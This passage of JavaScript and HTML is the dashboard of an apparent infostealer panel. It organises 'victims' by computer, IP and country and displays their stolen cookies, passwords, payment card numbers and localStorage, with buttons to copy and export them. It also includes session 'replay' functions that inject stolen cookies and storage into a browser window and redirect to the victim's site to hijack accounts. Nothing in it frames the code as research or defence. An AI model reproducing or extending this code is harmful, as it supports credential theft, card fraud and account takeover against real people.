                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testDomainFromPC('${pcName.replace(/'/g, "\\'")}', '${domain}')">🔍</button>
                                <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomainFromPC('${pcName.replace(/'/g, "\\'")}', '${domain}')">📥</button>
                                <button class="btn-sm view" onclick="event.stopPropagation(); openPCModal('${pcName.replace(/'/g, "\\'")}', '${domain}')">👁️</button>
                            </div>
                        </div>
                    `;
                });

                const card = document.createElement('div');
                card.className = 'pc-card';
                card.innerHTML = `
                    <div class="pc-header" onclick="togglePC('${safeName}')">
                        <div class="pc-name">
                            <span class="icon">🖥️</span>
                            ${pcName}
                            <span style="font-size:11px;color:#64748b;font-weight:400;">(${pc.totalVictims} victims)</span>
                            <span class="expand-icon ${isOpen ? 'open' : ''}" id="expand-${safeName}">▼</span>
                        </div>
                        <div class="pc-stats">
                            <span class="cookies">🍪 ${pc.totalCookies}</span>
                            <span class="creds">🔐 ${pc.totalCreds}</span>
                            <span class="cards">💳 ${pc.totalCards}</span>
                            <span class="storage">💾 ${pc.totalStorage}</span>
                        </div>
                    </div>
                    <div class="pc-meta">
                        <span class="flag">${flag}</span>
                        <span class="ip">${pc.ip}</span>
                        <span class="country">${pc.country}</span>
                        <span style="color:#475569;">🕐 ${timeAgo(pc.latestTime)}</span>
                        <button class="btn-icon-sm rename" onclick="event.stopPropagation(); openRename('${pcName.replace(/'/g, "\\'")}')" title="Rename PC">✏️</button>
                    </div>
                    <div class="pc-body ${isOpen ? 'open' : ''}" id="body-${safeName}">
                        <div class="domain-list">
                            ${domainsHtml}
                        </div>
                    </div>
                    <div class="pc-footer-actions">
                        <button class="btn-sm danger" onclick="showDeletePCConfirm('${pcName.replace(/'/g, "\\'")}')">🗑️ Delete PC</button>
                        <button class="btn-sm primary" onclick="downloadPCTxt('${pcName.replace(/'/g, "\\'")}')">📝 TXT</button>
                        <button class="btn-sm violet" onclick="downloadPCJson('${pcName.replace(/'/g, "\\'")}')">📄 JSON</button>
                    </div>
                `;
                grid.appendChild(card);
            });
        }

        function renderTrash(data) {
            const grouped = groupByPC(data);
            const pcNames = Object.keys(grouped);

            const grid = document.getElementById('trashGrid');
            grid.innerHTML = '';

            if (pcNames.length === 0) {
                grid.innerHTML = `<div class="empty-state"><div class="icon">🗑️</div><h3>Trash is empty</h3></div>`;
                return;
            }

            pcNames.forEach(pcName => {
                const pc = grouped[pcName];
                const flag = getFlagEmoji(pc.countryCode);

                let domainsHtml = '';
                Object.keys(pc.domains).forEach(domain => {
                    const d = pc.domains[domain];
                    const displayDomain = domain === 'unknown' ? '🌐 unknown' : '🌐 ' + domain;
                    domainsHtml += `
                        <div class="domain-item" style="cursor:default;">
                            <span class="domain-name">${displayDomain}</span>
                            <div class="domain-stats">
                                <span class="cookies">🍪 ${d.cookies}</span>
                                ${d.creds > 0 ? `<span class="creds">🔐 ${d.creds}</span>` : ''}
                                ${d.cards > 0 ? `<span class="cards">💳 ${d.cards}</span>` : ''}
                                ${d.storage > 0 ? `<span class="storage">💾 ${d.storage}</span>` : ''}
                            </div>
                        </div>
                    `;
                });

                const card = document.createElement('div');
                card.className = 'pc-card';
                card.innerHTML = `
                    <div class="pc-header" style="cursor:default;">
                        <div class="pc-name">
                            <span class="icon">🗑️</span>
                            ${pcName}
                            <span style="font-size:11px;color:#64748b;font-weight:400;">(${pc.totalVictims} victims)</span>
                        </div>
                        <div class="pc-stats">
                            <span class="cookies">🍪 ${pc.totalCookies}</span>
                            <span class="creds">🔐 ${pc.totalCreds}</span>
                            <span class="cards">💳 ${pc.totalCards}</span>
                            <span class="storage">💾 ${pc.totalStorage}</span>
                        </div>
                    </div>
                    <div class="pc-meta">
                        <span class="flag">${flag}</span>
                        <span class="ip">${pc.ip}</span>
                        <span class="country">${pc.country}</span>
                        <span style="color:#f59e0b;">🗑️ Deleted</span>
                    </div>
                    <div class="pc-body open">
                        <div class="domain-list">${domainsHtml}</div>
                    </div>
                    <div class="pc-footer-actions">
                        <button class="btn-sm primary" onclick="showRestorePCConfirm('${pcName.replace(/'/g, "\\'")}')">↩️ Restore PC</button>
                        <button class="btn-sm danger" onclick="showPermanentDeletePCConfirm('${pcName.replace(/'/g, "\\'")}')">🗑️ Permanently Delete</button>
                    </div>
                `;
                grid.appendChild(card);
            });
        }

        // ============================================================
        // ACCORDION TOGGLE
        // ============================================================

        function togglePC(safeName) {
            pcOpenState[safeName] = !pcOpenState[safeName];
            const body = document.getElementById('body-' + safeName);
            const icon = document.getElementById('expand-' + safeName);
            if (body) {
                body.classList.toggle('open');
                if (icon) {
                    icon.classList.toggle('open');
                }
            }
        }

        // ============================================================
        // RENAME PC
        // ============================================================

        function openRename(pcName) {
            renameTarget = pcName;
            document.getElementById('renameInput').value = pcName;
            document.getElementById('renameOverlay').classList.add('active');
            setTimeout(() => {
                document.getElementById('renameInput').focus();
                document.getElementById('renameInput').select();
            }, 100);
        }

        function closeRename() {
            document.getElementById('renameOverlay').classList.remove('active');
            renameTarget = null;
        }

        function confirmRename() {
            const newName = document.getElementById('renameInput').value.trim();
            if (!newName) {
                showToast('❌ Please enter a valid PC name', 'error');
                return;
            }
            if (newName === renameTarget) {
                closeRename();
                return;
            }
            
            showToast('⏳ Renaming...', 'warning');
            
            fetch('/api/rename-pc', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ oldName: renameTarget, newName: newName })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === 'ok') {
                    closeRename();
                    showToast(`✅ ${data.message}`, 'success');
                    fetchData();
                    fetchTrash();
                    if (currentView === 'victims') renderVictimsView();
                    if (currentView === 'replay') renderReplayView();
                    if (currentView === 'cookies') renderCookiesView();
                    if (currentView === 'creds') renderCredsView();
                    if (currentView === 'cards') renderCardsView();
                    if (currentView === 'storage') renderStorageView();
                } else {
                    showToast('❌ ' + (data.message || 'Failed to rename'), 'error');
                }
            })
            .catch((err) => {
                showToast('❌ Failed to connect to server: ' + err.message, 'error');
            });
        }

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                if (document.getElementById('renameOverlay').classList.contains('active')) {
                    closeRename();
                }
            }
        });

        // ============================================================
        // REPLAY FUNCTIONS
        // ============================================================

        function getEntryForPCDomain(pcName, domain) {
            for (const entry of allData) {
                const entryPc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                let entryDomain = extractDomain(entry);
                if (entryPc === pcName && entryDomain === domain) {
                    return entry;
                }
            }
            return null;
        }

        function replayDomainForPC(pcName, domain) {
            const entry = getEntryForPCDomain(pcName, domain);
            if (!entry) {
                showToast('❌ No data found for this PC + domain', 'error');
                return;
            }
            const cookies = entry.cookies || {};
            if (Object.keys(cookies).length === 0) {
                showToast('❌ No cookies found', 'error');
                return;
            }
            let actualDomain = domain;
            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                const cookieKeys = Object.keys(cookies);
                for (const key of cookieKeys) {
                    const parts = key.split('|');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
                        actualDomain = parts[0];
                        break;
                    }
                }
                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                    showToast('⚠️ No valid domain for replay', 'error');
                    return;
                }
            }
            const win = window.open('', '_blank');
            if (!win) {
                showToast('⚠️ Popup blocked. Allow popups.', 'error');
                return;
            }
            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            win.document.write(`
                <!DOCTYPE html>
                <html><head><title>Loading ${cleanDomain}...</title>
                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
                <div class="s"></div>
                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
                <script>
                    const cookies = ${JSON.stringify(cookies)};
                    Object.entries(cookies).forEach(([name, value]) => {
                        try { document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; } catch(e) {}
                    });
                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
                <\/script>
            </body></html>
            `);
            win.document.close();
            showToast('▶️ Replay started for ' + cleanDomain + ' (' + Object.keys(cookies).length + ' cookies)', 'success');
        }

        function replayStorageDomain(pcName, domain) {
            const entry = getEntryForPCDomain(pcName, domain);
            if (!entry) {
                showToast('❌ No data found for this PC + domain', 'error');
                return;
            }
            const storage = entry.localStorage || {};
            if (Object.keys(storage).length === 0) {
                showToast('❌ No LocalStorage found', 'error');
                return;
            }
            let actualDomain = domain;
            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                const storageKeys = Object.keys(storage);
                for (const key of storageKeys) {
                    const parts = key.split(':');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
                        actualDomain = parts[0];
                        break;
                    }
                }
                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                    showToast('⚠️ No valid domain for replay', 'error');
                    return;
                }
            }
            const win = window.open('', '_blank');
            if (!win) {
                showToast('⚠️ Popup blocked. Allow popups.', 'error');
                return;
            }
            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            win.document.write(`
                <!DOCTYPE html>
                <html><head><title>Loading ${cleanDomain}...</title>
                <style>body{background:#0a0a0a;color:#8b5cf6;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#8b5cf6;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
                <div class="s"></div>
                <p>Replaying LocalStorage for <strong>${cleanDomain}</strong>...</p>
                <p style="font-size:11px;color:#475569;">${Object.keys(storage).length} items</p>
                <script>
                    const storage = ${JSON.stringify(storage)};
                    Object.entries(storage).forEach(([key, value]) => {
                        try { localStorage.setItem(key, value); } catch(e) {}
                    });
                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
                <\/script>
            </body></html>
            `);
            win.document.close();
            showToast('💾 Replay started for ' + cleanDomain + ' (' + Object.keys(storage).length + ' items)', 'success');
        }

        function testDomainFromPC(pcName, domain) {
            const entry = getEntryForPCDomain(pcName, domain);
            if (!entry) {
                showToast('❌ No data found', 'error');
                return;
            }
            let actualDomain = domain;
            if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                const cookies = entry.cookies || {};
                const cookieKeys = Object.keys(cookies);
                for (const key of cookieKeys) {
                    const parts = key.split('|');
                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
                        actualDomain = parts[0];
                        break;
                    }
                }
                if (actualDomain === 'unknown' || actualDomain.includes('railway.app')) {
                    showToast('⚠️ No valid domain to test', 'error');
                    return;
                }
            }
            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
            window.open('https://' + cleanDomain, '_blank');
            showToast('🔍 Opened ' + cleanDomain + ' in new tab', 'success');
        }

        function downloadDomainFromPC(pcName, domain) {
            const entry = getEntryForPCDomain(pcName, domain);
            if (!entry) {
                showToast('❌ No data found', 'error');
                return;
            }
            const cookies = entry.cookies || {};
            if (Object.keys(cookies).length === 0) {
                showToast('❌ No cookies to download', 'error');
                return;
            }
            const data = { pc: pcName, domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cookies_${pcName}_${domain}_${new Date().toISOString().slice(0,10)}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 Downloaded ' + Object.keys(cookies).length + ' cookies', 'success');
        }

        function openPCModal(pcName, domain) {
            const entry = getEntryForPCDomain(pcName, domain);
            if (entry) {
                openModalForEntry(entry._uniqueId);
            } else {
                showToast('❌ No victim found', 'error');
            }
        }

        // ============================================================
        // PC DELETE FUNCTIONS
        // ============================================================

        function showDeletePCConfirm(pcName) {
            const grouped = groupByPC(allData);
            const count = grouped[pcName]?.totalVictims || 0;
            showCustomConfirm(
                'Delete PC',
                `Delete ALL ${count} victims from ${pcName}?`,
                '🗑️',
                () => { deletePC(pcName); },
                true
            );
        }

        async function deletePC(pcName) {
            const toDelete = allData.filter(e => {
                const p = e.pcName || e.fingerprint?.hostname || e.ip || 'Unknown PC';
                return p === pcName;
            });
            let deleted = 0;
            for (const entry of toDelete) {
                if (entry._uniqueId) {
                    try {
                        const res = await fetch(`/api/delete/${entry._uniqueId}`, { method: 'DELETE' });
                        if (res.status === 401) { window.location.href = '/login'; return; }
                        const data = await res.json();
                        if (data.status === 'ok') deleted++;
                    } catch (e) {}
                }
            }
            showToast(`🗑️ Deleted ${deleted} victims from ${pcName}`, 'success');
            await fetchData();
            await fetchTrash();
        }

        function showRestorePCConfirm(pcName) {
            showCustomConfirm(
                'Restore PC',
                `Restore ALL victims from ${pcName}?`,
                '↩️',
                () => { restorePC(pcName); },
                false
            );
        }

        async function restorePC(pcName) {
            const toRestore = trashData.filter(e => {
                const p = e.pcName || e.fingerprint?.hostname || e.ip || 'Unknown PC';
                return p === pcName;
            });
            let restored = 0;
            for (const entry of toRestore) {
                if (entry._uniqueId) {
                    try {
                        const res = await fetch(`/api/restore/${entry._uniqueId}`, { method: 'POST' });
                        if (res.status === 401) { window.location.href = '/login'; return; }
                        const data = await res.json();
                        if (data.status === 'ok') restored++;
                    } catch (e) {}
                }
            }
            showToast(`↩️ Restored ${restored} victims from ${pcName}`, 'success');
            await fetchTrash();
            await fetchData();
        }

        function showPermanentDeletePCConfirm(pcName) {
            showCustomConfirm(
                'Permanently Delete PC',
                `Permanently delete ALL victims from ${pcName} from trash?`,
                '⚠️',
                () => { permanentDeletePC(pcName); },
                true
            );
        }

        async function permanentDeletePC(pcName) {
            const toDelete = trashData.filter(e => {
                const p = e.pcName || e.fingerprint?.hostname || e.ip || 'Unknown PC';
                return p === pcName;
            });
            let deleted = 0;
            for (const entry of toDelete) {
                if (entry._uniqueId) {
                    try {
                        const res = await fetch(`/api/trash/permanent/${entry._uniqueId}`, { method: 'DELETE' });
                        if (res.status === 401) { window.location.href = '/login'; return; }
                        const data = await res.json();
                        if (data.status === 'ok') deleted++;
                    } catch (e) {}
                }
            }
            showToast(`🗑️ Permanently deleted ${deleted} victims from ${pcName}`, 'success');
            await fetchTrash();
        }

        function downloadPCTxt(pcName) {
            const grouped = groupByPC(allData);
            const pc = grouped[pcName];
            if (!pc) { showToast('❌ No data', 'error'); return; }
            const content = formatTxt(pc.entries, `PC — ${pcName} (${pc.totalVictims} victims)`);
            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `pc_${pcName}_${new Date().toISOString().slice(0,10)}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 PC TXT exported', 'success');
        }

        function downloadPCJson(pcName) {
            const grouped = groupByPC(allData);
            const pc = grouped[pcName];
            if (!pc) { showToast('❌ No data', 'error'); return; }
            const blob = new Blob([JSON.stringify(pc.entries, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `pc_${pcName}_${new Date().toISOString().slice(0,10)}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 PC JSON exported', 'success');
        }

        // ============================================================
        // COOKIES VIEW
        // ============================================================

        function renderCookiesView() {
            const wrap = document.getElementById('cookiesTableWrap');
            const grouped = groupByPC(allData);
            const pcNames = Object.keys(grouped);

            let allCookies = [];
            pcNames.forEach(pcName => {
                const pc = grouped[pcName];
                Object.keys(pc.domains).forEach(domain => {
                    const d = pc.domains[domain];
                    d.entries.forEach(entry => {
                        const cookies = entry.cookies || {};
                        Object.entries(cookies).forEach(([name, value]) => {
                            allCookies.push({
                                pc: pcName,
                                domain: domain,
                                name: name,
                                value: value,
                                valuable: isValuable(name),
                                entryId: entry._uniqueId
                            });
                        });
                    });
                });
            });

            if (allCookies.length === 0) {
                wrap.innerHTML = `<div class="empty-state"><div class="icon">🍪</div><h3>No cookies stolen</h3></div>`;
                return;
            }

            let html = `
                <div style="font-size:11px;color:#64748b;margin-bottom:6px;">Total: ${allCookies.length} cookies</div>
                <table class="cookies-table">
                    <thead>
                        <tr>
                            <th>PC</th>
                            <th>Domain</th>
                            <th>Name</th>
                            <th>Value</th>
                            <th style="text-align:center;">Status</th>
                            <th style="text-align:center;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            allCookies.slice(0, 150).forEach((cookie, idx) => {
                const escapedValue = cookie.value.replace(/'/g, "\\'");
                const displayDomain = cookie.domain === 'unknown' ? 'unknown' : cookie.domain;
                html += `
                    <tr>
                        <td class="pc-label">${cookie.pc}</td>
                        <td class="cookie-domain" onclick="openModalForEntry('${cookie.entryId}')" style="cursor:pointer;">${displayDomain}</td>
                        <td class="cookie-name">${cookie.name}</td>
                        <td class="cookie-value" title="${cookie.value}">${cookie.value.length > 40 ? cookie.value.slice(0,40)+'...' : cookie.value}</td>
                        <td style="text-align:center;">${cookie.valuable ? '<span class="cookie-valuable">Valuable</span>' : '<span style="color:#475569;font-size:8px;">—</span>'}</td>
                        <td style="text-align:center;white-space:nowrap;">
                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
                            <button class="btn-icon-sm download" onclick="downloadItem('${cookie.name}', '${escapedValue}', 'cookie')">⬇️</button>
                        </td>
                    </tr>
                `;
            });

            if (allCookies.length > 150) {
                html += `<tr><td colspan="6" style="text-align:center;color:#475569;padding:8px;">Showing 150 of ${allCookies.length}</td></tr>`;
            }
            html += `</tbody></table>`;
            wrap.innerHTML = html;
        }

        // ============================================================
        // CREDENTIALS VIEW
        // ============================================================

        function renderCredsView() {
            const wrap = document.getElementById('credsTableWrap');
            let allCreds = [];

            allData.forEach(entry => {
                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                const domain = extractDomain(entry);
                const creds = entry.credentials || [];
                creds.forEach(c => {
                    const name = c.name || c.username || c.field || 'unknown';
                    const value = c.value || c.password || '';
                    const type = c.type || 'text';
                    let url = c.url || c.origin_url || domain;
                    if (url && !url.includes('http')) {
                        url = 'https://' + url;
                    }
                    if (!value || value === '' || value === 'undefined' || value === 'null') return;
                    allCreds.push({
                        pc: pc,
                        domain: domain,
                        name: name,
                        value: value,
                        type: type,
                        url: url,
                        ip: entry.ip,
                        time: entry.receivedAt,
                        entryId: entry._uniqueId
                    });
                });
            });

            if (allCreds.length === 0) {
                wrap.innerHTML = `<div class="empty-state"><div class="icon">🔐</div><h3>No credentials stolen</h3></div>`;
                return;
            }

            let html = `
                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">🔐 Total: <strong style="color:#ec4899;">${allCreds.length}</strong> credentials</div>
                <table class="cookies-table">
                    <thead>
                        <tr>
                            <th>PC</th>
                            <th>Domain</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Type</th>
                            <th>Link</th>
                            <th>Time</th>
                            <th style="text-align:center;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            allCreds.slice(0, 200).forEach((cred, idx) => {
                const escapedValue = cred.value.replace(/'/g, "\\'");
                const visKey = 'cred-vis-' + idx;
                const isVisible = passwordVisibility[visKey] || false;
                const displayDomain = cred.domain === 'unknown' ? 'unknown' : cred.domain;
                const displayUrl = cred.url && cred.url !== 'https://' ? cred.url : 'https://' + displayDomain;
                html += `
                    <tr class="cred-row">
                        <td class="pc-label">${cred.pc}</td>
                        <td class="cookie-domain" onclick="openModalForEntry('${cred.entryId}')" style="cursor:pointer;">${displayDomain}</td>
                        <td class="cred-name">${cred.name}</td>
                        <td class="cred-value ${isVisible ? '' : 'password-hidden'}" id="cred-val-${idx}">${isVisible ? cred.value : cred.value.replace(/./g, '•')}</td>
                        <td><span class="cred-type">${cred.type}</span></td>
                        <td><a href="${displayUrl}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${displayUrl.length > 25 ? displayUrl.slice(0,25)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a></td>
                        <td style="color:#475569;font-size:10px;">${timeAgo(cred.time)}</td>
                        <td style="text-align:center;white-space:nowrap;">
                            <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'cred-val-${idx}')">👁️</button>
                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
                            <button class="btn-icon-sm download" onclick="downloadItem('${cred.name}', '${escapedValue}', 'credential')">⬇️</button>
                        </td>
                    </tr>
                `;
            });

            if (allCreds.length > 200) {
                html += `<tr><td colspan="8" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCreds.length}</td></tr>`;
            }
            html += `</tbody></table>`;
            wrap.innerHTML = html;
        }

        // ============================================================
        // CARDS VIEW
        // ============================================================

        function renderCardsView() {
            const wrap = document.getElementById('cardsTableWrap');
            let allCards = [];

            allData.forEach(entry => {
                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                const domain = extractDomain(entry);
                const cards = entry.cards || [];
                cards.forEach(c => {
                    let value = c.value || c.number || c.card_number || '';
                    const name = c.name || c.cardholder || c.holder || 'Unknown';
                    const type = c.type || 'card-number';
                    let url = c.url || c.origin_url || domain;
                    if (url && !url.includes('http')) {
                        url = 'https://' + url;
                    }
                    if (!value || value === '' || value === 'undefined' || value === 'null') return;
                    if (c.month && c.year && !value.includes('/')) {
                        value = c.month + '/' + c.year;
                    }
                    allCards.push({
                        pc: pc,
                        domain: domain,
                        name: name,
                        value: value,
                        type: type,
                        url: url,
                        ip: entry.ip,
                        time: entry.receivedAt,
                        entryId: entry._uniqueId
                    });
                });
            });

            if (allCards.length === 0) {
                wrap.innerHTML = `<div class="empty-state"><div class="icon">💳</div><h3>No cards stolen</h3></div>`;
                return;
            }

            let html = `
                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">💳 Total: <strong style="color:#06b6d4;">${allCards.length}</strong> cards</div>
                <table class="cookies-table">
                    <thead>
                        <tr>
                            <th>PC</th>
                            <th>Domain</th>
                            <th>Cardholder</th>
                            <th>Number / Expiry</th>
                            <th>Type</th>
                            <th>Link</th>
                            <th>Time</th>
                            <th style="text-align:center;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            allCards.slice(0, 200).forEach((card, idx) => {
                const escapedValue = card.value.replace(/'/g, "\\'");
                const visKey = 'card-vis-' + idx;
                const isVisible = passwordVisibility[visKey] || false;
                const displayValue = isVisible ? card.value : card.value.replace(/[0-9]/g, '•');
                const displayDomain = card.domain === 'unknown' ? 'unknown' : card.domain;
                const displayUrl = card.url && card.url !== 'https://' ? card.url : 'https://' + displayDomain;
                html += `
                    <tr class="card-row">
                        <td class="pc-label">${card.pc}</td>
                        <td class="cookie-domain" onclick="openModalForEntry('${card.entryId}')" style="cursor:pointer;">${displayDomain}</td>
                        <td class="card-name">${card.name}</td>
                        <td class="card-value ${isVisible ? '' : 'password-hidden'}" id="card-val-${idx}">${displayValue}</td>
                        <td><span class="card-type">${card.type}</span></td>
                        <td><a href="${displayUrl}" target="_blank" class="data-item-link" style="font-size:9px;">🔗 ${displayUrl.length > 25 ? displayUrl.slice(0,25)+'...' : displayUrl.replace(/^https?:\/\//, '')}</a></td>
                        <td style="color:#475569;font-size:10px;">${timeAgo(card.time)}</td>
                        <td style="text-align:center;white-space:nowrap;">
                            <button class="btn-icon-sm eye" onclick="togglePasswordVis('${visKey}', 'card-val-${idx}')">👁️</button>
                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
                            <button class="btn-icon-sm download" onclick="downloadItem('${card.name}', '${escapedValue}', 'card')">⬇️</button>
                        </td>
                    </tr>
                `;
            });

            if (allCards.length > 200) {
                html += `<tr><td colspan="8" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allCards.length}</td></tr>`;
            }
            html += `</tbody></table>`;
            wrap.innerHTML = html;
        }

        // ============================================================
        // LOCALSTORAGE VIEW
        // ============================================================

        function renderStorageView() {
            const wrap = document.getElementById('storageTableWrap');
            let allStorage = [];

            allData.forEach(entry => {
                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                const domain = extractDomain(entry);
                const storage = entry.localStorage || {};
                Object.entries(storage).forEach(([key, value]) => {
                    let browser = 'Unknown';
                    let cleanKey = key;
                    if (key.includes(':')) {
                        const parts = key.split(':');
                        browser = parts[0];
                        cleanKey = parts.slice(1).join(':');
                    }
                    allStorage.push({
                        pc: pc,
                        domain: domain,
                        key: cleanKey,
                        value: value,
                        browser: browser,
                        ip: entry.ip,
                        time: entry.receivedAt,
                        entryId: entry._uniqueId
                    });
                });
            });

            if (allStorage.length === 0) {
                wrap.innerHTML = `<div class="empty-state"><div class="icon">💾</div><h3>No LocalStorage stolen</h3></div>`;
                return;
            }

            let html = `
                <div style="font-size:11px;color:#64748b;margin-bottom:8px;">💾 Total: <strong style="color:#8b5cf6;">${allStorage.length}</strong> LocalStorage items</div>
                <table class="cookies-table">
                    <thead>
                        <tr>
                            <th>PC</th>
                            <th>Domain</th>
                            <th>Browser</th>
                            <th>Key</th>
                            <th>Value</th>
                            <th>Time</th>
                            <th style="text-align:center;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
            `;

            allStorage.slice(0, 200).forEach((item, idx) => {
                const escapedValue = item.value.replace(/'/g, "\\'");
                const displayValue = item.value.length > 50 ? item.value.slice(0,50)+'...' : item.value;
                const displayDomain = item.domain === 'unknown' ? 'unknown' : item.domain;
                html += `
                    <tr class="storage-row">
                        <td class="pc-label">${item.pc}</td>
                        <td class="cookie-domain" onclick="openModalForEntry('${item.entryId}')" style="cursor:pointer;">${displayDomain}</td>
                        <td><span class="storage-browser">${item.browser}</span></td>
                        <td class="storage-key">${item.key}</td>
                        <td class="storage-value" title="${item.value}">${displayValue}</td>
                        <td style="color:#475569;font-size:10px;">${timeAgo(item.time)}</td>
                        <td style="text-align:center;white-space:nowrap;">
                            <button class="btn-icon-sm copy" onclick="copyText('${escapedValue}')">📋</button>
                            <button class="btn-icon-sm download" onclick="downloadItem('${item.key}', '${escapedValue}', 'localstorage')">⬇️</button>
                        </td>
                    </tr>
                `;
            });

            if (allStorage.length > 200) {
                html += `<tr><td colspan="7" style="text-align:center;color:#475569;padding:8px;">Showing 200 of ${allStorage.length}</td></tr>`;
            }
            html += `</tbody></table>`;
            wrap.innerHTML = html;
        }

        // ============================================================
        // VICTIMS VIEW
        // ============================================================

        function renderVictimsView() {
            const grid = document.getElementById('victimsGrid');
            const grouped = groupByPC(allData);
            const pcNames = Object.keys(grouped);

            if (pcNames.length === 0) {
                grid.innerHTML = `<div class="empty-state"><div class="icon">👤</div><h3>No victims yet</h3></div>`;
                return;
            }

            let totalVictims = 0;
            pcNames.forEach(pcName => { totalVictims += grouped[pcName].totalVictims; });

            let html = `
                <div class="section-header">
                    👤 All Victims
                    <span class="count">(${totalVictims} total)</span>
                </div>
            `;

            pcNames.forEach(pcName => {
                const pc = grouped[pcName];
                const flag = getFlagEmoji(pc.countryCode);
                const safeName = 'vgroup-' + pcName.replace(/[^a-zA-Z0-9]/g, '_');
                
                if (pcOpenState[safeName] === undefined) {
                    pcOpenState[safeName] = false;
                }
                const isOpen = pcOpenState[safeName];

                let victimEntriesHtml = '';
                pc.entries.forEach(entry => {
                    const domain = extractDomain(entry);
                    const cookieCount = Object.keys(entry.cookies || {}).length;
                    const credCount = (entry.credentials || []).length;
                    const cardCount = (entry.cards || []).length;
                    const storageCount = Object.keys(entry.localStorage || {}).length;
                    const time = timeAgo(entry.receivedAt);
                    const fullTime = formatFullTime(entry.receivedAt);
                    const entryFlag = getFlagEmoji(entry.countryCode);
                    const displayDomain = domain === 'unknown' ? 'unknown' : domain;

                    let statsHtml = '';
                    if (cookieCount > 0) statsHtml += `<span class="cookies">🍪 ${cookieCount}</span>`;
                    if (credCount > 0) statsHtml += `<span class="creds">🔐 ${credCount}</span>`;
                    if (cardCount > 0) statsHtml += `<span class="cards">💳 ${cardCount}</span>`;
                    if (storageCount > 0) statsHtml += `<span class="storage">💾 ${storageCount}</span>`;

                    victimEntriesHtml += `
                        <div class="victim-card" onclick="openModalForEntry('${entry._uniqueId}')">
                            <button class="v-delete" onclick="event.stopPropagation(); showDeleteConfirm('${entry._uniqueId}', '${domain}')" title="Delete victim">🗑️</button>
                            <div class="v-header">
                                <span class="flag">${entryFlag}</span>
                                <span class="ip">${entry.ip || 'Unknown'}</span>
                                <span class="domain-name">🌐 ${displayDomain}</span>
                            </div>
                            <div class="v-details">
                                <span class="country">${entry.country || 'Unknown'}</span>
                                <span class="time" title="${fullTime}">🕐 ${time}</span>
                            </div>
                            <div class="v-stats">${statsHtml}</div>
                            <div class="v-actions">
                                <button class="btn-sm ${cookieCount > 0 ? 'replay-cookies' : 'disabled'}" onclick="${cookieCount > 0 ? `event.stopPropagation(); replaySession('${domain}')` : ''}">▶️</button>
